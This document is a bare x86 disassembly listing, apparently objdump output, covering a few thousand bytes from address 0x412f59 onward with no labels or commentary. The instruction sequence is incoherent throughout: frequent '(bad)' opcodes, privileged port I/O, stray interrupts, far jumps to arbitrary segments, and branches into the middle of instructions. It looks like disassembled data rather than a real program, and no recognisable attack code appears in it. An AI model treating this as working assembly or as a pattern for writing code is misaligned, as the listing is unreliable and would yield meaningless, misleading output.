  412f59:	retf   0xcce5
  412f5c:	pop    esi
  412f5d:	in     eax,0xc3
  412f5f:	push   edx
  412f60:	pusha  
  412f61:	lock mov BYTE PTR [ebp+0x1a],al
  412f65:	(bad)  
  412f66:	inc    edi
  412f67:	pop    ebp
  412f68:	mov    ecx,0xbfe49d6d
  412f6d:	xchg   ebx,eax
  412f6e:	add    dh,BYTE PTR [ebx-0x24]
  412f71:	mov    esi,0x5cade43a
  412f76:	and    bl,BYTE PTR [ebx+0x45]
  412f79:	inc    edx
  412f7a:	mov    ebp,0xfc980d4d
  412f7f:	inc    eax
  412f80:	sahf   
  412f81:	mov    ds:0x8d8182c5,eax
  412f86:	sub    DWORD PTR [eax+0x2],esp
  412f89:	in     eax,0x14
  412f8b:	cmp    ebx,DWORD PTR [esi]
  412f8d:	mov    ebp,edi
  412f8f:	ror    esp,cl
  412f91:	inc    ecx
  412f92:	xchg   ecx,eax
  412f93:	dec    ebx
  412f94:	ja     0x412f4e
  412f96:	or     eax,DWORD PTR [eax-0x57]
  412f99:	sub    BYTE PTR [edx-0x7c367d10],bh
  412f9f:	xchg   ebx,eax
  412fa0:	push   0x55732e1a
  412fa5:	js     0x413020
  412fa7:	mul    DWORD PTR [eax-0x45]
  412faa:	(bad)  
  412fab:	loopne 0x412f8d
  412fad:	dec    ebx
  412fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412faf:	add    BYTE PTR ds:0x40500e5c,cl
  412fb5:	out    dx,eax
  412fb6:	cmp    ecx,esi
  412fb8:	arpl   WORD PTR [ecx],ax
  412fba:	pop    ss
  412fbb:	and    al,0x39
  412fbd:	in     al,dx
  412fbe:	(bad)  
  412fc0:	mov    ecx,0x8f51d687
  412fc5:	adc    DWORD PTR [edi],0xb7a5a54d
  412fcb:	jae    0x412fc0
  412fcd:	dec    esp
  412fce:	xchg   esp,eax
  412fcf:	mov    cl,0x4b
  412fd1:	dec    eax
  412fd2:	pop    esi
  412fd3:	mov    ch,0x29
  412fd5:	pop    edx
  412fd6:	push   ebp
  412fd7:	fs mov esp,0x77d134a
  412fdd:	lods   al,BYTE PTR ds:[esi]
  412fde:	int3   
  412fdf:	fdiv   DWORD PTR [edi+ecx*8+0x5eb77b0]
  412fe6:	mov    ?,WORD PTR [edx]
  412fe8:	adc    DWORD PTR [edx+0x780b7e72],edx
  412fee:	dec    edi
  412fef:	xchg   edi,eax
  412ff0:	jle    0x41306a
  412ff2:	jecxz  0x412ff9
  412ff4:	(bad)  [edi-0x73b8587d]
  412ffa:	scas   al,BYTE PTR es:[edi]
  412ffb:	or     BYTE PTR [edx+0x19],dl
  412ffe:	mov    cs,WORD PTR [edx+0x5b70168e]
  413004:	mov    bh,0xc2
  413006:	mov    eax,ds:0xcad6cf4a
  41300b:	lds    ebp,FWORD PTR [ecx+esi*1]
  41300e:	pop    esp
  41300f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413011:	push   ecx
  413012:	inc    edx
  413013:	frstor [ebp+0x5da3a6e1]
  413019:	bound  ebp,QWORD PTR [eax]
  41301b:	(bad)  
  41301c:	mov    ds:0x2642084a,eax
  413021:	mov    esi,0x5f25fd
  413026:	push   0xe6d71ab9
  41302b:	xchg   esi,eax
  41302c:	inc    esi
  41302d:	add    BYTE PTR [ecx+0x403d4f25],dh
  413033:	mul    BYTE PTR [ebp+0x57]
  413036:	jo     0x412fed
  413038:	(bad)
  41303b:	fnstenv [eax]
  41303d:	push   0x6e5856ac
  413042:	loope  0x41307d
  413044:	inc    ebx
  413045:	sti    
  413046:	ds mov ebp,0x256a692d
  41304c:	in     eax,0xf3
  41304e:	and    DWORD PTR [ebx-0x1b],ecx
  413051:	lahf   
  413052:	cdq    
  413053:	je     0x413034
  413055:	js     0x41303d
  413057:	fmulp  st(6),st
  413059:	and    ah,BYTE PTR [ebx]
  41305b:	popa   
  41305c:	mov    al,ds:0x67fa4eff
  413061:	sub    BYTE PTR [edx+0x7],bl
  413064:	sbb    esp,DWORD PTR [ebp+0x4918125c]
  41306a:	mov    edi,0xa41527a
  41306f:	adc    al,0xad
  413071:	je     0x413075
  413073:	xchg   edi,eax
  413074:	jge    0x413023
  413076:	ret    
  413077:	inc    esi
  413078:	cmp    DWORD PTR [edi-0x68c998bd],edi
  41307e:	xchg   esp,eax
  41307f:	imul   edi,DWORD PTR [ecx+0x1fa164bc],0xffffffd9
  413086:	inc    edi
  413087:	push   esi
  413088:	shl    DWORD PTR [eax+0x1d],0xbd
  41308c:	xor    esi,DWORD PTR [eax+0x1b8caadb]
  413092:	jae    0x41306a
  413094:	mov    edi,ebx
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	stc    
  413098:	into   
  413099:	push   0xffffff90
  41309b:	test   al,0x92
  41309d:	xlat   BYTE PTR ds:[ebx]
  41309e:	mov    esp,DWORD PTR [edx-0x7b]
  4130a1:	push   esp
  4130a2:	xor    ebp,DWORD PTR [esi+0x7732f492]
  4130a8:	xchg   DWORD PTR [esi+0x6e],esp
  4130ab:	pop    ebp
  4130ac:	dec    eax
  4130ad:	inc    esi
  4130ae:	(bad)  
  4130af:	xor    dh,al
  4130b1:	cmc    
  4130b2:	imul   esp,DWORD PTR [edi],0xaa2d10ad
  4130b8:	pop    ds
  4130b9:	in     eax,dx
  4130ba:	xor    dh,BYTE PTR [edx]
  4130bc:	mov    eax,ds:0x1746b9f1
  4130c1:	stos   BYTE PTR es:[edi],al
  4130c2:	xchg   DWORD PTR [ecx-0xa],ebp
  4130c5:	jne    0x4130fc
  4130c7:	loope  0x41306a
  4130c9:	(bad)  
  4130ca:	in     eax,dx
  4130cb:	dec    eax
  4130cc:	add    BYTE PTR [esi],bl
  4130ce:	fadd   st,st(3)
  4130d0:	jmp    0x77b:0x5539823
  4130d7:	jge    0x413125
  4130d9:	xlat   BYTE PTR ds:[ebx]
  4130da:	push   cs
  4130db:	inc    edi
  4130dc:	cmp    al,BYTE PTR [ebx+edi*2+0x64]
  4130e0:	push   ss
  4130e1:	xchg   BYTE PTR [ecx-0x27a9bbde],bh
  4130e7:	aaa    
  4130e8:	pop    ebx
  4130e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130ea:	test   al,0x2d
  4130ec:	cmp    DWORD PTR [ecx],edi
  4130ee:	ja     0x413138
  4130f0:	or     eax,0xd77b890b
  4130f5:	sub    al,0xde
  4130f7:	inc    esp
  4130f8:	aas    
  4130f9:	dec    edx
  4130fa:	retf   0x2420
  4130fd:	push   es
  4130fe:	std    
  4130ff:	mov    edx,0x721bc039
  413104:	int    0x80
  413106:	imul   edx,DWORD PTR [ebx+0x32ef07c5],0x930d98f6
  413110:	push   ebx
  413111:	jns    0x4130f2
  413113:	(bad)  
  413114:	sub    bh,BYTE PTR [edi-0x75]
  413117:	in     al,0x58
  413119:	add    al,0xad
  41311b:	push   eax
  41311c:	icebp  
  41311d:	inc    edx
  41311e:	pop    es
  41311f:	xchg   BYTE PTR [edi],ch
  413121:	dec    ebx
  413122:	imul   esi,edi,0x148e6196
  413128:	xchg   ebp,eax
  413129:	rcr    al,0x39
  41312c:	or     eax,0xf5ea2dea
  413131:	test   BYTE PTR [ebp-0x27],cl
  413134:	dec    ebp
  413135:	mov    bl,0xc0
  413137:	fisttp WORD PTR [edi-0x11ef0020]
  41313d:	bound  edx,QWORD PTR [edx]
  41313f:	push   cs
  413140:	ror    al,cl
  413142:	mov    eax,0xb668261b
  413147:	or     DWORD PTR [esi-0x31fc6cd3],edi
  41314d:	xchg   esi,eax
  41314e:	xchg   esi,eax
  41314f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413150:	adc    eax,0xf098f8f7
  413155:	add    al,0x35
  413157:	aaa    
  413158:	adc    al,0x5e
  41315a:	es iret 
  41315c:	xor    cl,BYTE PTR [ecx-0x7720a3a2]
  413162:	pop    ebp
  413163:	imul   edx,esp,0xffffff9d
  413166:	dec    edi
  413167:	(bad)  
  413168:	std    
  413169:	inc    ecx
  41316a:	dec    ebp
  41316b:	outs   dx,DWORD PTR ds:[esi]
  41316c:	iret   
  41316d:	pop    ecx
  41316e:	mov    ebp,0x2d2b2ce7
  413173:	xor    DWORD PTR [ebp+eax*4-0x3e],edi
  413177:	and    al,0xf6
  413179:	cmp    eax,0xf43fd7d4
  41317e:	aaa    
  41317f:	(bad)  
  413180:	sar    DWORD PTR [ebx+0x5862dde7],1
  413186:	jnp    0x413150
  413188:	aam    0x8a
  41318a:	xor    al,0x7c
  41318c:	inc    esp
  41318d:	sub    al,0x3b
  41318f:	mov    eax,0x1bacddb7
  413194:	or     DWORD PTR [eax+0x2966e591],0x69f0cbcb
  41319e:	enter  0x147c,0x27
  4131a2:	mov    ebx,0xff527326
  4131a7:	js     0x41318b
  4131a9:	int3   
  4131aa:	adc    edx,ebx
  4131ac:	cld    
  4131ad:	mov    ds:0xadb9d443,al
  4131b2:	mov    bl,0xab
  4131b4:	pop    ebx
  4131b5:	scas   eax,DWORD PTR es:[edi]
  4131b6:	inc    BYTE PTR [ebx+0x2584d16f]
  4131bc:	inc    ecx
  4131bd:	repnz and BYTE PTR [esi-0x1b30ba04],cl
  4131c4:	loope  0x413219
  4131c6:	cs daa 
  4131c8:	lock pop ds
  4131ca:	push   edx
  4131cb:	push   esp
  4131cc:	icebp  
  4131cd:	aad    0xb3
  4131cf:	nop
  4131d0:	pop    ss
  4131d1:	outs   dx,BYTE PTR ds:[esi]
  4131d2:	sbb    al,0xf9
  4131d4:	mov    cl,0x33
  4131d6:	mov    bl,ch
  4131d8:	or     BYTE PTR [ebx-0x29c5a99e],al
  4131de:	test   BYTE PTR [ebx],dl
  4131e0:	movq   mm4,mm6
  4131e3:	mov    esi,0x42a62357
  4131e8:	std    
  4131e9:	dec    DWORD PTR [edi+0x7011076f]
  4131ef:	add    ecx,edx
  4131f1:	outs   dx,BYTE PTR ds:[esi]
  4131f2:	xchg   ecx,eax
  4131f3:	daa    
  4131f4:	daa    
  4131f5:	mov    ecx,0x4c5107c
  4131fa:	out    0x5b,eax
  4131fc:	adc    eax,DWORD PTR ds:0x1f351d7a
  413202:	mov    eax,ds:0x9335868a
  413207:	sbb    ebp,0x2b
  41320a:	retf   0xb0ae
  41320d:	inc    ecx
  41320e:	repz xchg edx,eax
  413210:	xchg   DWORD PTR ds:0xdd4661a4,edi
  413216:	sbb    cl,BYTE PTR [ecx]
  413218:	inc    ecx
  413219:	lods   eax,DWORD PTR ds:[esi]
  41321a:	adc    dh,BYTE PTR [ebx+ebp*1-0x770c6349]
  413221:	pop    ebx
  413222:	xor    DWORD PTR [eax],edi
  413224:	loopne 0x4131de
  413226:	es cdq 
  413228:	jnp    0x413222
  41322a:	fst    DWORD PTR [edx]
  41322c:	lea    ecx,[esp+ecx*1]
  41322f:	shl    DWORD PTR [esi],0xa1
  413232:	(bad)
  413236:	arpl   WORD PTR [edi+0x44],dx
  413239:	out    0x3d,al
  41323b:	into   
  41323c:	jge    0x4131e0
  41323e:	jae    0x413227
  413240:	(bad)  
  413241:	stos   DWORD PTR es:[edi],eax
  413242:	xor    BYTE PTR [edi],al
  413244:	xchg   esp,eax
  413245:	cld    
  413246:	(bad)  
  413247:	inc    eax
  413248:	jae    0x4132c1
  41324a:	rcl    cl,cl
  41324c:	pushf  
  41324d:	mov    ebp,0x163dc840
  413252:	pop    es
  413253:	inc    esp
  413254:	mov    WORD PTR [edi+0x4989c4e9],?
  41325a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41325b:	mov    fs,WORD PTR [ebp-0x564c1f7a]
  413261:	sbb    eax,0x5f60d464
  413266:	dec    ebp
  413267:	cs out dx,al
  413269:	mov    dl,BYTE PTR [eax-0x4d6c8cb4]
  41326f:	xchg   edi,eax
  413270:	mov    al,0x6d
  413272:	dec    ebp
  413273:	cmp    esi,0xfffffffa
  413276:	mov    ds:0x1b36358f,eax
  41327b:	cdq    
  41327c:	pusha  
  41327d:	and    al,BYTE PTR [eax]
  41327f:	push   ds
  413280:	push   0x7c
  413282:	pop    edx
  413283:	jae    0x41323b
  413285:	xchg   edi,eax
  413286:	icebp  
  413287:	add    dh,BYTE PTR [ecx]
  413289:	dec    edi
  41328a:	jl     0x413227
  41328c:	jns    0x4132b7
  41328e:	jp     0x4132f1
  413290:	push   ebx
  413291:	outs   dx,DWORD PTR ds:[esi]
  413292:	lods   eax,DWORD PTR ds:[esi]
  413293:	jmp    0x4132ab
  413295:	push   ebx
  413296:	xchg   ecx,eax
  413297:	and    DWORD PTR [esi-0x7b],edx
  41329a:	mov    dh,0x33
  41329c:	mov    dl,0x6f
  41329e:	or     DWORD PTR [eax+edx*1-0x46530a0a],edx
  4132a5:	loop   0x413261
  4132a7:	and    esp,ebx
  4132a9:	adc    al,0x7b
  4132ab:	aad    0xe3
  4132ad:	jmp    0x8a97160e
  4132b2:	aas    
  4132b3:	xorps  xmm7,XMMWORD PTR [ebx+esi*1+0x5d8d02f1]
  4132bb:	push   ds
  4132bc:	pop    ebp
  4132bd:	aas    
  4132be:	ret    0x219c
  4132c1:	dec    ebp
  4132c2:	out    0xdd,al
  4132c4:	add    esp,edx
  4132c6:	daa    
  4132c7:	arpl   WORD PTR [eax+0x82cdb17],bx
  4132cd:	loop   0x41332d
  4132cf:	fucom  st(5)
  4132d1:	push   0x62
  4132d3:	dec    edx
  4132d4:	repz mov ah,0xac
  4132d7:	addr16 popa 
  4132d9:	jecxz  0x4132b1
  4132db:	pop    ecx
  4132dc:	inc    ebp
  4132dd:	pop    ecx
  4132de:	push   0x27
  4132e0:	ret    
  4132e1:	jle    0x413353
  4132e3:	lock mov ebp,0x5213e1cb
  4132e9:	jge    0x413314
  4132eb:	test   eax,0x53d357d5
  4132f0:	xchg   dh,bh
  4132f2:	add    DWORD PTR [ebx-0x68],esp
  4132f5:	enter  0x1845,0x4a
  4132f9:	out    0x97,al
  4132fb:	pop    es
  4132fc:	pushf  
  4132fd:	adc    esi,ecx
  4132ff:	push   ds
  413300:	xchg   ebx,eax
  413301:	and    DWORD PTR [edi+0x6670fd61],esp
  413307:	sbb    DWORD PTR [edx+0xc01904f],edi
  41330d:	(bad)  
  41330f:	push   edx
  413310:	add    eax,0xc8e13c83
  413315:	shl    esp,1
  413317:	je     0x41334f
  413319:	mov    ds:0xebc5b437,eax
  41331e:	adc    ah,dl
  413320:	mov    ebx,0x5d5555be
  413325:	push   edx
  413326:	das    
  413327:	xchg   ecx,eax
  413328:	imul   ecx,edx,0xffffffd5
  41332b:	mov    eax,0x6d52f76
  413330:	jp     0x413336
  413332:	scas   eax,DWORD PTR es:[edi]
  413333:	fsub   DWORD PTR [ecx-0x3350d634]
  413339:	(bad)  
  41333a:	lahf   
  41333b:	pop    es
  41333c:	mov    eax,0x2fdf61d9
  413341:	push   ss
  413342:	stos   DWORD PTR es:[edi],eax
  413343:	aam    0x8d
  413345:	mov    esi,0x962e18c3
  41334a:	mov    ds:0x218ff49,al
  41334f:	mov    eax,0x365533ca
  413354:	ins    BYTE PTR es:[edi],dx
  413355:	push   eax
  413356:	ror    DWORD PTR [ecx-0x41],0xd3
  41335a:	arpl   WORD PTR ds:0xc5ac8a02,dx
  413360:	sar    DWORD PTR ds:0xebd7d7ab,cl
  413366:	ins    BYTE PTR es:[edi],dx
  413367:	hlt    
  413368:	mov    BYTE PTR [ecx-0x75afc189],al
  41336e:	les    edx,FWORD PTR ds:0x25bbc437
  413374:	lods   al,BYTE PTR ds:[esi]
  413375:	mov    dh,0x2
  413377:	xchg   ecx,eax
  413378:	(bad)  
  413379:	mov    al,0xcc
  41337b:	xor    al,0xe3
  41337d:	call   0x9add:0x54865404
  413384:	neg    DWORD PTR [ebp-0x62ffd4fd]
  41338a:	sub    eax,0x6be91b63
  41338f:	(bad)  
  413390:	push   ecx
  413391:	imul   BYTE PTR ds:0x6e57edb7
  413397:	icebp  
  413398:	sbb    al,0xab
  41339a:	je     0x413325
  41339c:	mov    bh,0x84
  41339e:	inc    ebp
  41339f:	and    BYTE PTR [ecx+ebp*1+0x77],bh
  4133a3:	xchg   ebp,eax
  4133a4:	inc    esi
  4133a5:	add    eax,DWORD PTR [ecx+0x56]
  4133a8:	or     al,0xfc
  4133aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ab:	test   al,0x64
  4133ad:	pushf  
  4133ae:	push   edx
  4133af:	nop
  4133b0:	popa   
  4133b1:	cld    
  4133b2:	cli    
  4133b3:	add    DWORD PTR [ebx+ebp*8-0x7365cef2],ebp
  4133ba:	test   esp,ecx
  4133bc:	dec    esi
  4133bd:	mov    ebp,0x7f56bf26
  4133c2:	aam    0xe9
  4133c4:	jb     0x41334a
  4133c6:	pop    ebp
  4133c7:	add    BYTE PTR [bx+si],0x27
  4133cb:	mov    BYTE PTR [esi],ah
  4133cd:	(bad)  
  4133ce:	out    dx,eax
  4133cf:	xchg   esi,eax
  4133d0:	xchg   ebp,eax
  4133d1:	xlat   BYTE PTR ds:[ebx]
  4133d2:	pop    ds
  4133d3:	xor    dl,dh
  4133d5:	aad    0xe0
  4133d7:	lds    ebp,FWORD PTR [ecx-0xe]
  4133da:	xchg   edi,eax
  4133db:	pop    ebx
  4133dc:	stos   DWORD PTR es:[edi],eax
  4133dd:	inc    ecx
  4133de:	pop    es
  4133df:	pop    esi
  4133e0:	push   esp
  4133e1:	mov    al,ds:0xb37cf546
  4133e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133e7:	fisubr WORD PTR [ebx-0x8473e16]
  4133ed:	mov    es,esp
  4133ef:	addr16 jmp 0xc6ad:0xf1daad7a
  4133f7:	sub    esp,DWORD PTR [eax+0x74]
  4133fa:	pusha  
  4133fb:	push   esp
  4133fc:	xchg   edi,eax
  4133fd:	mov    ecx,0x7eb9088c
  413402:	sub    al,0x9b
  413405:	sub    ah,dl
  413407:	std    
  413408:	je     0x4133cc
  41340a:	frstor [ebx+0x75]
  41340d:	adc    al,0x16
  41340f:	ins    BYTE PTR es:[edi],dx
  413410:	(bad)  
  413411:	and    ebx,DWORD PTR [esi+0x4cfe3848]
  413417:	or     eax,0x1de5f29
  41341c:	das    
  41341d:	jbe    0x41345e
  41341f:	jb     0x413418
  413421:	(bad)  
  413422:	popf   
  413423:	push   ebp
  413424:	mov    ss,WORD PTR [edi-0x1f9f668f]
  41342a:	jo     0x4133f5
  41342c:	mov    al,ds:0x9858274c
  413431:	in     eax,dx
  413432:	mov    ebp,0x5ee9da14
  413437:	mov    al,ds:0xb4582fc6
  41343c:	mov    eax,0xac93b09
  413441:	repnz outs dx,DWORD PTR ds:[esi]
  413443:	dec    eax
  413444:	aad    0xec
  413446:	fwait
  413447:	lds    edx,FWORD PTR [ecx+0x54c74762]
  41344d:	addr16 inc esi
  41344f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413450:	es int 0x83
  413453:	mov    ecx,?
  413455:	and    eax,0xf34d4b4c
  41345a:	fisubr WORD PTR [ebp+0x17fe71c4]
  413460:	sti    
  413461:	popa   
  413462:	bound  esi,QWORD PTR [eax]
  413464:	xchg   edx,eax
  413465:	inc    esi
  413466:	mov    ch,0xf0
  413468:	jge    0x413425
  41346a:	aad    0x91
  41346c:	xlat   BYTE PTR ds:[ebx]
  41346d:	cli    
  41346e:	xchg   DWORD PTR [ecx*1+0x4fb41adc],edi
  413475:	dec    ecx
  413476:	or     BYTE PTR [esi],ch
  413478:	shl    DWORD PTR [ebx],cl
  41347a:	mov    BYTE PTR [edi],ah
  41347c:	jp     0x413442
  41347e:	fxch   st(5)
  413480:	inc    esp
  413481:	rcl    BYTE PTR [esi],0xa5
  413484:	call   0x9b440d67
  413489:	ror    DWORD PTR [esi+0x1cd761bf],0xd1
  413490:	xchg   ebx,eax
  413491:	mov    ah,0x68
  413493:	or     bl,BYTE PTR [ebp+ecx*1-0x66ce687c]
  41349a:	pop    ds
  41349b:	and    eax,0xaf548e6
  4134a0:	mov    dh,0x35
  4134a2:	sub    eax,0xfbe42f50
  4134a7:	or     DWORD PTR [edx+0xf346478],0xffffffe3
  4134ae:	retf   0x9d1
  4134b1:	add    cl,0x16
  4134b4:	mov    edx,0x9baf400d
  4134b9:	lods   al,BYTE PTR ds:[esi]
  4134ba:	into   
  4134bb:	rcl    DWORD PTR [edi+ebx*8],0xa5
  4134bf:	mov    bh,dh
  4134c1:	iret   
  4134c2:	adc    al,BYTE PTR [eax+0x38]
  4134c5:	pop    ds
  4134c6:	shr    BYTE PTR [esi+ebp*8],1
  4134c9:	fmul   QWORD PTR [esi+0x1de4aec5]
  4134cf:	xlat   BYTE PTR ds:[ebx]
  4134d0:	pop    ebp
  4134d1:	out    dx,al
  4134d2:	lods   al,BYTE PTR ds:[esi]
  4134d3:	push   esp
  4134d4:	adc    BYTE PTR [edi],dl
  4134d6:	dec    eax
  4134d7:	das    
  4134d8:	test   DWORD PTR [edi],edi
  4134da:	ret    
  4134db:	pop    ds
  4134dc:	push   ebx
  4134dd:	pop    ds
  4134de:	push   ss
  4134df:	mov    bh,0x9d
  4134e1:	imul   esi,eax,0xbd5bf2b6
  4134e7:	imul   edx,DWORD PTR [edx+0x71615c35],0x3b
  4134ee:	or     eax,0xca38cbec
  4134f3:	cmp    eax,DWORD PTR [ebx]
  4134f5:	int    0xba
  4134f7:	push   edx
  4134f8:	mov    dl,0xea
  4134fa:	aas    
  4134fb:	les    edx,FWORD PTR [ecx]
  4134fd:	cmp    ah,dh
  4134ff:	retf   0x40e2
  413502:	mov    eax,0xf619375b
  413507:	or     ch,BYTE PTR [edx]
  413509:	or     bl,BYTE PTR [edi-0x785b4666]
  41350f:	pop    esp
  413510:	xchg   ecx,eax
  413511:	mov    bh,dh
  413513:	push   esi
  413514:	sub    BYTE PTR [edi+edi*4+0x68],ch
  413518:	push   eax
  413519:	jnp    0x413541
  41351b:	and    al,0x4a
  41351d:	retf   
  41351e:	jae    0x413554
  413520:	jbe    0x41359a
  413522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413523:	mov    eax,0x85aa0795
  413528:	add    BYTE PTR [ebp+0x71036c9],dl
  41352e:	xchg   ebp,eax
  41352f:	cdq    
  413530:	and    edx,ebx
  413532:	in     eax,0x4a
  413534:	mov    cl,0x8c
  413536:	xor    eax,0x3a591e3b
  41353b:	pop    ebp
  41353c:	imul   edx,DWORD PTR [esi],0xffffff88
  41353f:	inc    eax
  413540:	xchg   ebx,eax
  413541:	pushf  
  413542:	packuswb mm1,QWORD PTR [eax+ecx*8]
  413546:	sbb    BYTE PTR [ecx+0x77],dh
  413549:	lock pop edi
  41354b:	and    eax,DWORD PTR [ecx+0x78]
  41354e:	and    dh,BYTE PTR [edi+0x74]
  413551:	mov    cl,0x58
  413553:	add    esp,DWORD PTR [edi-0x395124c0]
  413559:	imul   ebx,ecx,0xffffffa0
  41355c:	outs   dx,BYTE PTR ds:[esi]
  41355d:	aad    0x53
  41355f:	dec    edi
  413560:	(bad)  
  413561:	fild   QWORD PTR [ebx]
  413563:	xchg   BYTE PTR [ebp+ebx*1+0x2d],cl
  413567:	call   0xa60a:0xf6e23e59
  41356e:	xlat   BYTE PTR ds:[ebx]
  41356f:	ror    DWORD PTR [edx+0x1c],0x73
  413573:	aam    0x9e
  413575:	xchg   DWORD PTR [ebp+esi*8+0x48f55240],eax
  41357c:	(bad)  
  41357d:	fsubp  st(0),st
  41357f:	or     esi,DWORD PTR [esi+0x42]
  413582:	in     eax,0x95
  413584:	jnp    0x413597
  413586:	pushf  
  413587:	xor    ah,dl
  413589:	mov    esi,eax
  41358b:	std    
  41358c:	fwait
  41358d:	inc    esp
  41358e:	test   DWORD PTR [ecx],ecx
  413590:	cmp    DWORD PTR [ecx],0x5d3e4db
  413596:	mov    al,0x99
  413598:	or     BYTE PTR [edi],bh
  41359a:	dec    esi
  41359b:	inc    ebp
  41359c:	mov    ds:0xd7e95cb,al
  4135a1:	and    DWORD PTR [edi-0x67],0xde91e925
  4135a8:	dec    ebx
  4135a9:	xor    al,0x19
  4135ab:	ins    DWORD PTR es:[edi],dx
  4135ac:	lea    edx,[ecx-0x6136a15c]
  4135b2:	in     eax,0xd4
  4135b4:	cld    
  4135b5:	dec    edi
  4135b6:	pop    ss
  4135b7:	scas   al,BYTE PTR es:[edi]
  4135b8:	push   es
  4135b9:	mov    bh,0xd0
  4135bb:	not    DWORD PTR [ebx+0x3a1a9c6b]
  4135c1:	test   eax,0x9aa6959b
  4135c6:	test   ecx,0xf0f554dc
  4135cc:	jecxz  0x4135d9
  4135ce:	jmp    0x9ac63c87
  4135d3:	es in  al,dx
  4135d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135d6:	(bad)  
  4135d7:	sahf   
  4135d8:	push   edi
  4135d9:	pop    eax
  4135da:	imul   edx,esi,0x10004bd1
  4135e0:	or     eax,0x6dd17471
  4135e5:	ret    0xa1f6
  4135e8:	sub    eax,0x8ea9f72
  4135ed:	out    dx,eax
  4135ee:	or     DWORD PTR [ebx+0x51],edi
  4135f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f2:	dec    esp
  4135f3:	mov    ch,0x91
  4135f5:	aas    
  4135f6:	push   0x6b4b7c9e
  4135fb:	dec    edx
  4135fc:	jl     0x41364d
  4135fe:	dec    edx
  4135ff:	arpl   cx,sp
  413601:	fwait
  413602:	cs adc ebp,ebp
  413605:	xchg   ebp,eax
  413606:	pop    ebx
  413607:	or     DWORD PTR [eax+0x1a],0x2064b48e
  41360e:	test   DWORD PTR ds:[eax+0x27a1c60e],edx
  413615:	or     DWORD PTR [eax],ecx
  413617:	std    
  413618:	jae    0x413656
  41361a:	sahf   
  41361b:	mov    ch,0x48
  41361d:	add    al,0xb
  41361f:	push   ds
  413620:	rol    BYTE PTR [ebp+ebx*8-0x4a],1
  413624:	mov    edx,0x7d37097d
  413629:	push   edx
  41362a:	dec    ecx
  41362b:	mov    bh,0x16
  41362d:	inc    ebx
  41362e:	mov    eax,ds:0x1e3649ac
  413633:	and    al,0xc8
  413635:	(bad)  
  413636:	fnstenv [esi-0x57]
  413639:	rcl    ebx,cl
  41363b:	add    ch,BYTE PTR [esi]
  41363d:	mov    esp,0x226def84
  413642:	push   edx
  413643:	cld    
  413644:	dec    esp
  413645:	sub    BYTE PTR [esi+0x429cabc2],ah
  41364b:	loope  0x413636
  41364d:	pop    edx
  41364e:	and    ebp,DWORD PTR [eax+edi*8-0x39]
  413652:	pusha  
  413653:	add    DWORD PTR [edx-0x33e95214],0x2ee36313
  41365d:	fnstsw WORD PTR [ebx]
  41365f:	pop    esp
  413660:	jb     0x413635
  413662:	pop    esp
  413663:	ret    0xf185
  413666:	nop
  413667:	jl     0x41360e
  413669:	loop   0x413647
  41366b:	cmp    eax,0xb66433e9
  413670:	(bad)  
  413671:	test   dl,0x34
  413674:	xchg   esi,ebp
  413676:	mov    eax,ds:0xc00b17
  41367b:	cs xchg edx,eax
  41367d:	scas   al,BYTE PTR es:[edi]
  41367e:	repnz int 0xea
  413681:	adc    dl,BYTE PTR [edi-0x464f63c0]
  413687:	inc    edi
  413688:	dec    edx
  413689:	jb     0x4136b3
  41368b:	sbb    DWORD PTR [eax+0x24],0xffffff94
  41368f:	scas   al,BYTE PTR es:[edi]
  413690:	and    eax,0x53967430
  413695:	xrelease xchg BYTE PTR ds:0x221794f7,ah
  41369c:	cmp    al,0x3a
  41369e:	lock xchg ebx,eax
  4136a0:	stos   DWORD PTR es:[edi],eax
  4136a1:	mov    DWORD PTR [ebp-0x1fba39f5],esi
  4136a7:	int    0x9d
  4136a9:	xchg   edx,eax
  4136aa:	jg     0x413699
  4136ac:	and    dh,BYTE PTR [edx]
  4136ae:	pop    edi
  4136af:	mov    esp,0x97749b76
  4136b4:	jne    0x41371e
  4136b6:	in     eax,0x31
  4136b8:	mov    bl,0xf1
  4136ba:	loop   0x4136ea
  4136bc:	add    eax,edi
  4136be:	lods   al,BYTE PTR ds:[esi]
  4136bf:	lea    edi,[ebx]
  4136c1:	mov    bl,BYTE PTR [ecx+0x4a]
  4136c4:	out    dx,al
  4136c5:	mov    ch,0xc4
  4136c7:	cmp    eax,0x75cc0f97
  4136cc:	or     DWORD PTR [eax+0x47],esp
  4136cf:	fild   DWORD PTR [ebx+0xa9544dd]
  4136d5:	xor    eax,ecx
  4136d7:	or     edx,DWORD PTR ds:0x49a72991
  4136dd:	imul   edx,DWORD PTR [esi],0x7e
  4136e0:	push   edx
  4136e1:	ret    
  4136e2:	and    eax,0xf0bf63fe
  4136e7:	outs   dx,BYTE PTR ds:[esi]
  4136e8:	sub    eax,0xf484719a
  4136ed:	jmp    0x413755
  4136ef:	xchg   esp,eax
  4136f0:	out    dx,eax
  4136f1:	popa   
  4136f2:	or     al,0x3
  4136f4:	or     eax,ebx
  4136f6:	add    DWORD PTR [ecx+edx*8-0x808c897],ebp
  4136fd:	dec    ecx
  4136fe:	dec    esi
  4136ff:	sbb    al,0x90
  413701:	push   esi
  413702:	scas   eax,DWORD PTR es:[edi]
  413703:	dec    esp
  413704:	dec    edx
  413705:	pop    ds
  413706:	std    
  413707:	xor    dh,0xe6
  41370a:	lods   al,BYTE PTR ds:[esi]
  41370b:	(bad)  
  41370c:	scas   al,BYTE PTR es:[edi]
  41370d:	fcom   DWORD PTR [esi]
  41370f:	in     al,dx
  413710:	fwait
  413711:	jmp    0x52fd1897
  413716:	pop    ss
  413717:	jns    0x41372d
  413719:	call   0x7bf9e359
  41371e:	cwde   
  41371f:	xchg   edx,eax
  413720:	test   al,0x17
  413722:	(bad)  
  413723:	clc    
  413724:	popf   
  413725:	pusha  
  413726:	mov    ss,WORD PTR [ebx+0x2f]
